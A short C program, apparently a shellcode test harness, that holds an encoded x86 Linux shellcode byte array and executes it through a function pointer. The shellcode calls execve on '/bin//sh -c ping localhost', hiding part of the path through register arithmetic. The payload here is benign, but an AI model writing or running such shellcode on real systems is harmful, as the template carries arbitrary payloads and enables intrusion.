#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xdb\xf7\xe3\x52\xb8\x98\x97\x39\x34\xb3\x02\xf7\xe3\x48\x50\x68\x2f\x62\x69\x6e\x89\xe3\x52\xc7\x44\x24\xfc\x73\x74\x20\x20\xc7\x44\x24\xf8\x61\x6c\x68\x6f\xc7\x44\x24\xf4\x20\x6c\x6f\x63\xc7\x44\x24\xf0\x70\x69\x6e\x67\x83\xec\x10\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x56\x51\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

int main()

{
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

